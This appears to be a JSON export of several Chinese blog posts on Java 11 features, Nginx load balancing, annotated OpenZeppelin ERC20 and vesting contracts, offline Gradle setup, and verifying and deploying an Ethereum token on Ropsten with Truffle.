如今单文件程序在编写小实用程序时很常见，特别是脚本语言领域。从中开发者可以省去用 Java 编译程序等不必要工作，以及减少新手的入门障碍。在基于 Java 10 的程序实现中可以通过三种方式启动： 作为 * .class 文件 作为 * .jar 文件中的主类 作为模块中的主类 而在最新的 Java 11 中新增了一个启动方式，即可以在源代码中声明类，例如：如果名为 HelloWorld.java 的文件包含一个名为 hello.World 的类，那么该命令： 1$ java HelloWorld.java 也等同于：12$ javac HelloWorld.java$ java -cp . hello.World 用于 Lambda 参数的局部变量语法在 Lambda 表达式中使用局部变量类型推断是 Java 11 引入的唯一与语言相关的特性。 从 Java 10 开始，便引入了局部变量类型推断这一关键特性。类型推断允许使用关键字 var 作为局部变量的类型而不是实际类型，编译器根据分配给变量的值推断出类型。这一改进简化了代码编写、节省了开发者的工作时间，因为不再需要显式声明局部变量的类型，而是可以使用关键字 var，且不会使源代码过于复杂。 可以使用关键字 var 声明局部变量，如下所示：12var s = \"Hello Java 11\";System.out.println(s); 但是在 Java 10 中，还有下面几个限制： 只能用于局部变量上 声明时必须初始化 不能用作方法参数 不能在 Lambda 表达式中使用 Java 11 与 Java 10 的不同之处在于允许开发者在 Lambda 表达式中使用 var 进行参数声明。乍一看，这一举措似乎有点多余，因为在写代码过程中可以省略 Lambda 参数的类型，并通过类型推断确定它们。但是，添加上类型定义同时使用 @Nonnull 和 @Nullable 等类型注释还是很有用的，既能保持与局部变量的一致写法，也不丢失代码简洁。 Lambda 表达式使用隐式类型定义，它形参的所有类型全部靠推断出来的。隐式类型 Lambda 表达式如下： 1(x, y) -&gt; x.process(y) Java 10 为局部变量提供隐式定义写法如下：123var x = new Foo();for (var x : xs) &#123; ... &#125;try (var x = ...) &#123; ... &#125; catch ... 为了 Lambda 类型表达式中正式参数定义的语法与局部变量定义语法的不一致，且为了保持与其他局部变量用法上的一致性，希望能够使用关键字 var 隐式定义 Lambda 表达式的形参： 1(var x, var y) -&gt; x.process(y) 于是在 Java 11 中将局部变量和 Lambda 表达式的用法进行了统一，并且可以将注释应用于局部变量和 Lambda 表达式：12@Nonnull var x = new Foo();(@Nonnull var x, @Nullable var y) -&gt; x.process(y) 支持 TLS 1.3 协议Java 11 中包含了传输层安全性（TLS）1.3 规范（RFC 8446）的实现，替换了之前版本中包含的 TLS，包括 TLS 1.2，同时还改进了其他 TLS 功能，例如 OCSP 装订扩展（RFC 6066，RFC 6961），以及会话散列和扩展主密钥扩展（RFC 7627），在安全性和性能方面也做了很多提升。 新版本中包含了 Java 安全套接字扩展（JSSE）提供 SSL，TLS 和 DTLS 协议的框架和 Java 实现。目前，JSSE API 和 JDK 实现支持 SSL 3.0，TLS 1.0，TLS 1.1，TLS 1.2，DTLS 1.0 和 DTLS 1.2。 同时 Java 11 版本中实现的 TLS 1.3，重新定义了以下新标准算法名称： TLS 协议版本名称：TLSv1.3 SSLContext 算法名称：TLSv1.3 TLS 1.3 的 TLS 密码套件名称：TLS_AES_128_GCM_SHA256，TLS_AES_256_GCM_SHA384 用于 X509KeyManager 的 keyType：RSASSA-PSS 用于 X509TrustManager 的 authType：RSASSA-PSS 还为 TLS 1.3 添加了一个新的安全属性 jdk.tls.keyLimits。当处理了特定算法的指定数据量时，触发握手后，密钥和 IV 更新以导出新密钥。还添加了一个新的系统属性 jdk.tls.server.protocols，用于在 SunJSSE 提供程序的服务器端配置默认启用的协议套件。 之前版本中使用的 KRB5​​密码套件实现已从 Java 11 中删除，因为该算法已不再安全。同时注意，TLS 1.3 与以前的版本不直接兼容。 升级到 TLS 1.3 之前，需要考虑如下几个兼容性问题： TLS 1.3 使用半关闭策略，而 TLS 1.2 以及之前版本使用双工关闭策略，对于依赖于双工关闭策略的应用程序，升级到 TLS 1.3 时可能存在兼容性问题。 TLS 1.3 使用预定义的签名算法进行证书身份验证，但实际场景中应用程序可能会使用不被支持的签名算法。 TLS 1.3 再支持 DSA 签名算法，如果在服务器端配置为仅使用 DSA 证书，则无法升级到 TLS 1.3。 TLS 1.3 支持的加密套件与 TLS 1.2 和早期版本不同，若应用程序硬编码了加密算法单元，则在升级的过程中需要修改相应代码才能升级使用 TLS 1.3。 TLS 1.3 版本的 session 用行为及秘钥更新行为与 1.2 及之前的版本不同，若应用依赖于 TLS 协议的握手过程细节，则需要注意。 其他特性其他的看不懂，不写出来了。 更多信息请看 Java 11 新特性介绍","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"Nginx+Tomcat负载均衡","slug":"Web后端/Tomcat+Nginx负载均衡","date":"2018-09-21T11:52:36.000Z","updated":"2021-12-28T03:24:10.212Z","comments":true,"path":"Web后端/Tomcat+Nginx负载均衡/","link":"","permalink":"http://yoursite.com/Web后端/Tomcat+Nginx负载均衡/","excerpt":"","text":"环境和实现效果： 两个Tomcat实例监听8081和8083端口 NGINX监听80端口，通过负载均衡将请求转发到Tomcat实例 客户端访问80端口，结果是Tomcat响应的内容 1234567891011121314#负载均衡http &#123; upstream tomcattest.com &#123; server localhost:8081; server localhost:8083; &#125; server &#123; listen 80; server_name localhost; location / &#123; proxy_pass http://tomcattest.com; &#125; &#125;&#125; 配置解析： tomcattest.com是我随便填的，应该只是内部用的。 upstream有多种负载均衡模式，默认是按照顺序轮询。","categories":[{"name":"Web后端","slug":"Web后端","permalink":"http://yoursite.com/categories/Web后端/"}],"tags":[]},{"title":"9、OpenZeppelin ERC20源码注释","slug":"区块链/9、OpenZeppelin ERC20源码注释","date":"2018-09-08T15:50:36.000Z","updated":"2018-12-02T14:40:00.000Z","comments":true,"path":"区块链/9、OpenZeppelin ERC20源码注释/","link":"","permalink":"http://yoursite.com/区块链/9、OpenZeppelin ERC20源码注释/","excerpt":"","text":"ERC20：Ethereum Request for Comments 20，是一个基于以太坊代币的接口标准（协议）。所有符合 ERC-20 标准的代币都能立即兼容以太坊钱包，它能让用户和交易所，都能非常方便的管理多种代币，转账、存储、ICO 等等。 StandardToken.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132pragma solidity ^0.4.24;import &quot;./BasicToken.sol&quot;;import &quot;./ERC20.sol&quot;;/** * @title 标准 ERC20 token * * @dev 实现基础的标准token * @dev https://github.com/ethereum/EIPs/issues/20 * @dev Based on code by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol */contract StandardToken is ERC20, BasicToken &#123; mapping (address =&gt; mapping (address =&gt; uint256)) internal allowed; /** * @dev 从一个地址向另外一个地址转token * @param _from 转账的from地址 * @param _to address 转账的to地址 * @param _value uint256 转账token数量 */ function transferFrom( address _from, address _to, uint256 _value ) public returns (bool) &#123; // 做合法性检查 require(_to != address(0)); require(_value &lt;= balances[_from]); require(_value &lt;= allowed[_from][msg.sender]); //_from余额减去相应的金额 //_to余额加上相应的金额 //msg.sender可以从账户_from中转出的数量减少_value balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); // 触发Transfer事件 emit Transfer(_from, _to, _value); return true; &#125; /** * @dev 批准传递的address以代表msg.sender花费指定数量的token * * Beware that changing an allowance with this method brings the risk that someone may use both the old * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this * race condition is to first reduce the spender&apos;s allowance to 0 and set the desired value afterwards: * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729 * @param _spender 花费资金的地址 * @param _value 可以被花费的token数量 */ function approve(address _spender, uint256 _value) public returns (bool) &#123; //记录msg.sender允许_spender动用的token allowed[msg.sender][_spender] = _value; //触发Approval事件 emit Approval(msg.sender, _spender, _value); return true; &#125; /** * @dev 函数检查所有者允许的_spender花费的token数量 * @param _owner address 资金所有者地址. * @param _spender address 花费资金的spender的地址. * @return A uint256 指定_spender仍可用token的数量。 */ function allowance( address _owner, address _spender ) public view returns (uint256) &#123; //允许_spender从_owner中转出的token数 return allowed[_owner][_spender]; &#125; /** * @dev 增加所有者允许_spender花费代币的数量。 * * allowed[_spender] == 0时approve应该被调用. 增加allowed值最好使用此函数避免2此调用（等待知道第一笔交易被挖出） * From MonolithDAO Token.sol * @param _spender 花费资金的地址 * @param _addedValue 用于增加允许动用的token牌数量 */ function increaseApproval( address _spender, uint _addedValue ) public returns (bool) &#123; //在之前允许的数量上增加_addedValue allowed[msg.sender][_spender] = ( allowed[msg.sender][_spender].add(_addedValue)); //触发Approval事件 emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; &#125; /** * @dev 减少所有者允许_spender花费代币的数量 * * allowed[_spender] == 0时approve应该被调用. 减少allowed值最好使用此函数避免2此调用（等待知道第一笔交易被挖出） * From MonolithDAO Token.sol * @param _spender 花费资金的地址 * @param _subtractedValue 用于减少允许动用的token牌数量 */ function decreaseApproval( address _spender, uint _subtractedValue ) public returns (bool) &#123; uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue &gt; oldValue) &#123; //减少的数量少于之前允许的数量，则清零 allowed[msg.sender][_spender] = 0; &#125; else &#123; //减少对应的_subtractedValue数量 allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); &#125; //触发Approval事件 emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; &#125;&#125; BasicToken.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051pragma solidity ^0.4.24;import &quot;./ERC20Basic.sol&quot;;import &quot;../../math/SafeMath.sol&quot;;/** * @title 实现ERC20基本合约的接口 * @dev 基本的StandardToken，不包含allowances. */contract BasicToken is ERC20Basic &#123; using SafeMath for uint256; mapping(address =&gt; uint256) balances; uint256 totalSupply_; /** * @dev 返回存在的token总数 */ function totalSupply() public view returns (uint256) &#123; return totalSupply_; &#125; /** * @dev 给特定的address转token * @param _to 要转账到的address * @param _value 要转账的金额 */ function transfer(address _to, uint256 _value) public returns (bool) &#123; //做相关的合法验证 require(_to != address(0)); require(_value &lt;= balances[msg.sender]); // msg.sender余额中减去额度，_to余额加上相应额度 balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); //触发Transfer事件 emit Transfer(msg.sender, _to, _value); return true; &#125; /** * @dev 获取指定address的余额 * @param _owner 查询余额的address. * @return An uint256 representing the amount owned by the passed address. */ function balanceOf(address _owner) public view returns (uint256) &#123; return balances[_owner]; &#125;&#125; SafeERC20.sol (一个 ERC20 的安全操作库)123456789101112131415161718192021222324252627282930pragma solidity ^0.4.24;import &quot;./ERC20Basic.sol&quot;;import &quot;./ERC20.sol&quot;;/** * @title SafeERC20 * @dev 围绕ERC20操作发生故障的包装程序. * 可以在合约中通过这样使用这个库 `using SafeERC20 for ERC20;` 来使用安全的操作`token.safeTransfer(...)` */library SafeERC20 &#123; function safeTransfer(ERC20Basic token, address to, uint256 value) internal &#123; require(token.transfer(to, value)); &#125; function safeTransferFrom( ERC20 token, address from, address to, uint256 value ) internal &#123; require(token.transferFrom(from, to, value)); &#125; function safeApprove(ERC20 token, address spender, uint256 value) internal &#123; require(token.approve(spender, value)); &#125;&#125; 时间锁仓123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657pragma solidity ^0.4.24;import &quot;zeppelin-solidity/contracts/token/ERC20/SafeERC20.sol&quot;;/** * @title TokenTimelock * @dev TokenTimelock is a token holder contract that will allow a * beneficiary to extract the tokens after a given release time */contract TokenTimelock &#123; using SafeERC20 for ERC20Basic; // 代币种类（合约地址） ERC20Basic public token; // 释放后的受益人address address public beneficiary; // token可以被释放的时间戳(秒) uint256 public releaseTime; /** * 创建合约，定义Token，收益者，固定时间释放 * （Token要手动转入创建的合约地址） * * ERC20Basic _token : 锁仓的ERC20合约地址 * address _beneficiary: 受益者的合约地址 * uint256 _releaseTime: 锁仓时间（单位秒） */ constructor( ERC20Basic _token, address _beneficiary, uint256 _releaseTime ) public &#123; // solium-disable-next-line security/no-block-members require(_releaseTime &gt; block.timestamp); token = _token; beneficiary = _beneficiary; releaseTime = _releaseTime; &#125; /** * 将时间限制内的token转移给收益人.（合约中的余额 -&gt;合约中的收益人） */ function release() public &#123; // solium-disable-next-line security/no-block-members require(block.timestamp &gt;= releaseTime); uint256 amount = token.balanceOf(address(this)); require(amount &gt; 0); token.safeTransfer(beneficiary, amount); &#125;&#125; 断崖式持续锁仓123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132pragma solidity ^0.4.24;import &quot;zeppelin-solidity/contracts/token/ERC20/ERC20Basic.sol&quot;;import &quot;zeppelin-solidity/contracts/token/ERC20/SafeERC20.sol&quot;;import &quot;zeppelin-solidity/contracts/ownership/Ownable.sol&quot;;import &quot;zeppelin-solidity/contracts/math/SafeMath.sol&quot;;contract TokenLockVesting is Ownable&#123; using SafeMath for uint256; using SafeERC20 for ERC20Basic; event Released(uint256 amount); event Revoked(); // beneficiary of tokens after they are released address public beneficiary; uint256 public cliff; uint256 public cliffTs; uint256 public start; uint256 public duration; bool public revocable; mapping (address =&gt; uint256) public released; mapping (address =&gt; bool) public revoked; /** * @dev Creates a vesting contract that vests its balance of any ERC20 token to the * _beneficiary, gradually in a linear fashion until _start + _duration. By then all * of the balance will have vested. * @param _beneficiary address of the beneficiary to whom vested tokens are transferred * @param _cliff duration in seconds of the cliff in which tokens will begin to vest * @param _start the time (as Unix time) at which point vesting starts * @param _duration duration in seconds of the period in which the tokens will vest * @param _revocable whether the vesting is revocable or not */ constructor( address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable ) public &#123; require(_beneficiary != address(0)); require(_cliff &lt;= _duration); beneficiary = _beneficiary; revocable = _revocable; duration = _duration;//duration是一个x秒时间段 start = _start; cliff = _cliff; cliffTs = _start.add(_cliff);//_cliff是x秒时间段，cliffTs是一个时间戳 &#125; /** * @notice Transfers vested tokens to beneficiary. * @param _token ERC20 token which is being vested */ function release(ERC20Basic _token) public &#123; uint256 unreleased = releasableAmount(_token); require(unreleased &gt; 0); released[_token] = released[_token].add(unreleased); _token.safeTransfer(beneficiary, unreleased); emit Released(unreleased); &#125; /** * @notice Allows the owner to revoke the vesting. Tokens already vested * remain in the contract, the rest are returned to the owner. * @param _token ERC20 token which is being vested */ function revoke(ERC20Basic _token) public onlyOwner &#123; require(revocable); require(!revoked[_token]); uint256 balance = _token.balanceOf(address(this)); uint256 unreleased = releasableAmount(_token); uint256 refund = balance.sub(unreleased); revoked[_token] = true; _token.safeTransfer(owner, refund); emit Revoked(); &#125; /** * @dev 计算已授予但尚未释放的金额。 * @dev Calculates the amount that has already vested but hasn&apos;t been released yet. * @param _token ERC20 token which is being vested */ function releasableAmount(ERC20Basic _token) public view returns (uint256) &#123; return vestedAmount(_token).sub(released[_token]); &#125; /** * @dev 计算已授予的金额。 * @dev Calculates the amount that has already vested. * @param _token ERC20 token which is being vested */ function vestedAmount(ERC20Basic _token) public view returns (uint256) &#123; uint256 currentBalance = _token.balanceOf(address(this)); uint256 totalBalance = currentBalance.add(released[_token]); // block.timestamp 块校验unix时间戳 if (block.timestamp &lt; cliffTs) &#123; //没到释放的时间，所以返回0 return 0; &#125; else if (block.timestamp &gt;= start.add(duration) || revoked[_token]) &#123; //块时间已经超过了start + duration，所有的代币都可以释放 return totalBalance; &#125; else&#123; //持续释放时间之内 //mul: X * y //div：x / y // totalBalance * (block.timestamp - start) / duration //return totalBalance.mul(block.timestamp.sub(start)).div(duration); //改造 return totalBalance.mul(block.timestamp.sub(start).sub(cliff)).div(duration.sub(cliff)); &#125; &#125;&#125; 了解更多","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"Android Studio 离线安装Gradle","slug":"Android/Android Studio 离线安装Gradle","date":"2018-09-03T11:52:36.000Z","updated":"2021-12-28T03:24:10.102Z","comments":true,"path":"Android/Android Studio 离线安装Gradle/","link":"","permalink":"http://yoursite.com/Android/Android Studio 离线安装Gradle/","excerpt":"","text":"Android Studio 下载 gradle 一直很慢，或者是根本下载不了，而通过手动下载，则快很多。 以 gradle5.4.1 为例 下载gradle-5.4.1-all.zip 放置zip包到 .gradle 目录下，如：1C:\\Users\\kevin\\.gradle\\wrapper\\dists\\gradle-5.4.1-all 如果AS已经创建了类似 12112jdfhdhuhudshfsrwx 这种目录，则需要将zip包拷贝到这个目录下。 否则，直接放在 dists\\gradle-5.4.1-all 目录下。 注意zip包不需要解压 重启直接重启 Android Studio 或者点 Sysc GRadle Files 进行安装。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[{"name":"Gradle","slug":"Gradle","permalink":"http://yoursite.com/tags/Gradle/"}]},{"title":"8.3、验证发布到Ropsten网络的智能合约","slug":"区块链/8.3、验证智能合约","date":"2018-08-09T15:55:36.000Z","updated":"2019-07-04T13:52:36.000Z","comments":true,"path":"区块链/8.3、验证智能合约/","link":"","permalink":"http://yoursite.com/区块链/8.3、验证智能合约/","excerpt":"","text":"为什么要验证合约？源代码验证为与智能合约交互的用户提供了透明性。通过上传源代码，Etherscan将编译后的代码与区块链上的代码匹配。就像合同一样，“智能合约”应该为最终用户提供更多关于他们“数字签名”的信息，并让用户有机会审计代码，以独立地验证代码实际上做了应该做的事情。 ABI文件公开？目前我的Dapp做法需要将编译的合约 json 文件和WebApp放在一起，通过ajax读取 json 文件初始化合约。 如何验证？具体就是将代码上传到etherscan.io，只需几步操作。 在 Etherscan 上打开你的合约地址： https://ropsten.etherscan.io/address/{合约地址}#contracts 但是，我每次面对的都是500错误，被搞的抓狂。 坑坑 网上很多文章说Etherscan 不支持import，那是因为老版本verifyContract2的原因，现在verifyContract是支持import的,选择多文件上传即可。 单文件HelloWorld合约提交也是500错误（这个最坑） 错误500的原因合约提交500错误很烦，尝试了各种方法，网上说要用VPN，VPN也用上了，但是无奈当时是因为此VPN出了点状况，没能上Google。 这个500错误就是网络的问题，正确的判断是“提交的页面”有没有出现“人机身份验证”。 查看了一下Chrome的网络，可以看到有一个js文件请求失败了，这就是Google的“人机身份验证”。（坑：加载失败了没提示错误？？？没通过“人机身份验证”提示报错？？？） 成功爬坑 首先要用VPN科学上网，确认能上Google 在提交代码页面确认出现了“人机身份验证” 正常提交就OK了。 下面是用HelloWorld合约测试的结果： 合并工具如果依赖一些第三方库，而合约文件比较多，可以利用合并工具进行合并为单一文件。同时现在也是支持多文件和imports的。 1. SolidityFlattery这是Golang写的工具，直接下载 github 中 flat 可执行文件，丢在 /usr/bin 目录就可以使用了 1$ flat -input MetaCoin.sol -output SourceCode 2. solidity-flattener这个是Python3写的工具，依赖Python。 12$ pip3 install solidity-flattener$ solidity_flattener –output SourceCode.sol MetaCoin.sol 参考以下是参考的资料和摘录 《如何在Etherscan中支持合约接口调用》 实现步骤 合并合约：将所有import导入的合约和库（library）都写到一个文件中 验证合约：进入verify contract页面，指定已部署合约地址和名称 编译合约：选择Compiler版本和优化方案第一步比较繁琐，如果你使用了open-zeppelin之类的通用库，需要翻翻好多个目录才能把依赖的合约凑齐并放置在一个文件当中，而且特别要注意加上版本宏定义pragma solidity ^0.5.0;。 《如何发布你自己的 ICO》 在填写表单时有以下注意事项: Compiler 选择最新版本 Optimization 选择 No 虽然 solidity 支持 import 语法，但 Etherscan 对使用 import 进行开发的合约支持很鸡肋，目前它要求你需要把库文件也当作合约发布至网络才能够在表单中填写进行验证。当然我们也可以选择手动把 import 库文件的内容手动复制粘贴到代码框里，注意要保留全部内容，包括 pragma 声明一行。 《验证ETH智能合约》 利用 SolidityFlattery 工具来删除 import 和合并合约 《如何在Etherscan验证代币合约》 验证需要科学上网，否则会因网络问题造成验证失败 《3份有构造参数的合约验证示例》 https://ropsten.etherscan.io/address/0xcd4d737151d14742d9c75e2b9ef838e3b69bd00c#code https://etherscan.io/address/0x38c6A68304cdEfb9BEc48BbFaABA5C5B47818bb2#contracts https://etherscan.io/address/0x7da82c7ab4771ff031b66538d2fb9b0b047f6cf9#code https://etherscan.io/address/0x85bc00724203d53536072b000c44a2cc16cd12c5#code https://etherscan.io/address/0x63091244180ae240c87d1f528f5f269134cb07b3#code 《Demo HTTP Post for using the Source Code Verfication Submission API》 Contracts that use “imports” will need to have the ode concatenated into one file as we do not support “imports” in separate files. You can try using the Blockcat solidity-flattener or SolidityFlattery合约中使用了“imports”的，需要代码连接到一个文件中，因为我们不支持在单独的文件中使用“imports”。你可以尝试使用 Blockcat solidity-flattener 或 SolidityFlattery Ropsten部署合约-2 这个作者的情况和我遇到的很相似。 如何验证Ethereum smart contract的源代码","categories":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/categories/区块链/"}],"tags":[{"name":"区块链","slug":"区块链","permalink":"http://yoursite.com/tags/区块链/"}]},{"title":"8.2、基于truffle发布Token到Ropsten测试网络","slug":"区块链/8.2、基于truffle发布Token到Ropsten测试网络","date":"2018-08-08T15:55:36.000Z","updated":"2019-06-29T13:52:36.000Z","comments":true,"path":"区块链/8.2、基于truffle发布Token到Ropsten测试网络/","link":"","permalink":"http://yoursite.com/区块链/8.2、基于truffle发布Token到Ropsten测试网络/","excerpt":"","text":"我们利用 truffle 的集成环境发布一个名称为 VToken 的代币到Ropsten测试网络。 开发环境本示例在Ubuntu下开发(原因下面会解释)12node：v10.16.0npm：v6.9.0 truffle常用命令123456789101112131415161718192021222324252627282930samwen@samwen-ubuntu:~/VToken$ truffle -vTruffle v5.0.24 - a development framework for EthereumUsage: truffle &lt;command&gt; [options]Commands: build Execute build pipeline (if configuration present) compile Compile contract source files config Set user-level configuration options console Run a console with contract abstractions and commands available create Helper to create new contracts, migrations and tests debug Interactively debug any transaction on the blockchain (experimental) deploy (alias for migrate) develop Open a console with a local development blockchain exec Execute a JS module within this Truffle environment help List all commands or provide information about a specific command init Initialize new and empty Ethereum project install Install a package from the Ethereum Package Registry migrate Run migrations to deploy contracts networks Show addresses for deployed contracts on each network obtain Fetch and cache a specified compiler opcode Print the compiled opcodes for a given contract publish Publish a package to the Ethereum Package Registry run Run a third-party command test Run JavaScript and Solidity tests unbox Download a Truffle Box, a pre-built Truffle project version Show version number and exit watch Watch filesystem for changes and rebuild the project automaticallySee more at http://truffleframework.com/docs 初始化项目由于不需要webapp，所以直接初始化一个truffle项目即可。1234567891011121314151617181920212223242526samwen@samwen-ubuntu:~$ mkdir VTokensamwen@samwen-ubuntu:~$ cd VToken/samwen@samwen-ubuntu:~/VToken$ truffle init✔ Preparing to download✔ Downloading✔ Cleaning up temporary files✔ Setting up boxUnbox successful. Sweet!Commands: Compile: truffle compile Migrate: truffle migrate Test contracts: truffle testsamwen@samwen-ubuntu:~/VToken$ tree.├── contracts│ └── Migrations.sol├── migrations│ └── 1_initial_migration.js├── test└── truffle-config.js3 directories, 3 files 编写ERC20标准智能合约为了方便测试，我们继承 zeppelin-solidity 的ERC20合约，EIP-20标准文档。123456789samwen@samwen-ubuntu:~/VToken$ vim package.json&#123; \"name\": \"VToken\", \"version\": \"1.0.0\", \"dependencies\": &#123; &#125;&#125;samwen@samwen-ubuntu:~/VToken$ sudo npm install zeppelin-soliditysamwen@samwen-ubuntu:~/VToken$ vim /contracts/VToken.sol VToken合约代码123456789101112131415161718pragma solidity ^0.4.24;import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol';contract VToken is StandardToken &#123; string public name = \"VToken\"; string public symbol = \"VTK\"; uint8 public decimals = 18; uint public INITIAL_SUPPLY = 1000000000;//10亿 constructor()public&#123; totalSupply_ = INITIAL_SUPPLY;//此处发行量错误，看：修复！ balances[msg.sender] = INITIAL_SUPPLY; &#125;&#125; 修复！修复！修复！ 修复！修复！修复！ 修复！修复！修复！ 发布之后发现账号的VToken余额都是 0 ，才发现： 这里发行量 INITIAL_SUPPLY 搞错了，小数点是18位，应该还需要加18个零才是10亿。当然也可以设置 decimals=0 ，那么 VToken 就没有小数，最小单位就是 1VTk 。可以将构造函数修改为以下(decimals=18)：123//补“小数位”个数的零，这里是18。totalSupply_ = INITIAL_SUPPLY * 10 ** uint256(decimals); balances[msg.sender] = totalSupply_; 编译&amp;本地测试部署将 truffle-config.js 重命名为 truffle.js ,并修改内容为：1234567891011121314151617module.exports = &#123; networks: &#123; development: &#123; host: \"127.0.0.1\", port: 8545, network_id: \"*\", gas: 6721975, gasPrice: 20000000000 &#125;, &#125;, compilers: &#123; solc: &#123; version: \"0.4.24\" &#125; &#125;&#125; 在migrations目录下新建 2_deploy_contracts.js ，配置部署我们的合约。12345const VToken = artifacts.require(\"VToken\");module.exports = function(deployer) &#123; deployer.deploy(VToken);&#125;; 开始编译12345678samwen@samwen-ubuntu:~/VToken$ truffle compileCompiling your contracts...===========================&gt; Compiling ./contracts/VToken.sol&gt; Artifacts written to /home/samwen/VToken/build/contracts&gt; Compiled successfully using: - solc: 0.4.24+commit.e67f0147.Emscripten.clang 编译通过，用一个新的终端启动本地 testrpc。 如果没有安装，运行： npm install -g ganache-cli 12345678910111213141516171819samwen@samwen-ubuntu:~$ ganache-cliGanache CLI v6.4.4 (ganache-core: 2.5.6)...............HD Wallet==================Mnemonic: copy speak kitten fiscal wrestle stool unfair alcohol source siren chicken patientBase HD Path: m/44'/60'/0'/0/&#123;account_index&#125;Gas Price==================20000000000Gas Limit==================6721975Listening on 127.0.0.1:8545 开始部署 deploy 和 migrate 一样 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768samwen@samwen-ubuntu:~/VToken$ truffle deployCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Starting migrations...======================&gt; Network name: 'development'&gt; Network id: 1561694497418&gt; Block gas limit: 0x6691b71_initial_migration.js====================== Deploying 'Migrations' ---------------------- &gt; transaction hash: 0x327b6ca1a13f4d95206953a18b7228f6258db111ddfc94c7e19a2e2368189975 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0xbf744a6b346e8c4f1335077F3Fbcb94624E80F86 &gt; block number: 5 &gt; block timestamp: 1561695101 &gt; account: 0x43df1995a777C2b14D011D565beE7411109DaeF3 &gt; balance: 99.95728774 &gt; gas used: 277462 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.00554924 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.00554924 ETH2_deploy_contracts.js===================== Deploying 'VToken' ------------------ &gt; transaction hash: 0x21c591204930427919cdcbbd2f6b98895174e2798c0bed8499e7d7b8198c3403 &gt; Blocks: 0 Seconds: 0 &gt; contract address: 0x8E4FBa7256b92837723688AFFFc7DC6679d3d538 &gt; block number: 7 &gt; block timestamp: 1561695102 &gt; account: 0x43df1995a777C2b14D011D565beE7411109DaeF3 &gt; balance: 99.92621412 &gt; gas used: 1511673 &gt; gas price: 20 gwei &gt; value sent: 0 ETH &gt; total cost: 0.03023346 ETH &gt; Saving migration to chain. &gt; Saving artifacts ------------------------------------- &gt; Total cost: 0.03023346 ETHSummary=======&gt; Total deployments: 2&gt; Final cost: 0.0357827 ETHsamwen@samwen-ubuntu:~/VToken$ 到此证明我的项目的合约是没有问题的了，那么接下来就可以尝试部署到公网Ropsten网络。 注册infura.ioinfura提供公开以太坊和测试节点,在 https://infura.io/login 用邮箱注册一个账号和新建project，得到一个带token的链接地址。 infura的使用 申请ETH账号 用MetaMask申请一个账号（我申请的是： 0xAFEbF61AF27866a27D839f47CfBef7dd415bAB65） 选择“Ropsten测试网络” 点击“存入”，从“测试水管”领取一个ETH 导出“助记词” 如果安装MetaMask插件遇到网络问题，可以临时用网页钱包创建账号。 Ropsten网络配置修改 truffle.js123456789101112131415161718192021222324252627var HDWalletProvider = require(\"truffle-hdwallet-provider\");var mnemonic = \"MetaMask导出的助记词\";var infura = \"https://ropsten.infura.io/v3/&#123;你的token&#125;&#125;\";module.exports = &#123; networks: &#123; development: &#123; host: \"127.0.0.1\", // Localhost (default: none) port: 8545, // Standard Ethereum port (default: none) network_id: \"*\", // Any network (default: none) &#125;, ropsten: &#123; provider: () =&gt; new HDWalletProvider(mnemonic, infura), network_id: 3, // Ropsten's id gas: 6721975, gasPrice: 20000000000 &#125;, &#125;, compilers: &#123; solc: &#123; version: \"0.4.24\" &#125; &#125;&#125; 安装依赖1samwen@samwen-ubuntu:~/VToken$ npm install truffle-hdwallet-provider --unsafe-perm=true 此处坑比较多，特别是Win10下，文章后面描述在Ubuntu下的解决办法 ，《hdwallet安装问题》。 部署到Ropsten网络本次部署运气比较好，只遇到一次网络错误就部署成功了，有时候运行半天都部署不了。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129samwen@samwen-ubuntu:~/VToken$ truffle deploy --reset --network ropstenCompiling your contracts...===========================&gt; Everything is up to date, there is nothing to compile.Migrations dry-run (simulation)===============================&gt; Network name: 'ropsten-fork'&gt; Network id: 3&gt; Block gas limit: 0x7a12001_initial_migration.js======================Error: Invalid JSON RPC response: \"\" at Object.InvalidResponse (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/web3-providers-http/node_modules/web3-core-helpers/src/errors.js:42:1) at e.InvalidResponse [as onreadystatechange] (/home/samwen/VToken/node_modules/truffle-hdwallet-provider/dist/webpack:/truffle-hdwallet-provider/Users/tyler/projects/truffle/node_modules/web3-providers-http/src/index.js:92:1) at e._a [as dispatchEvent] 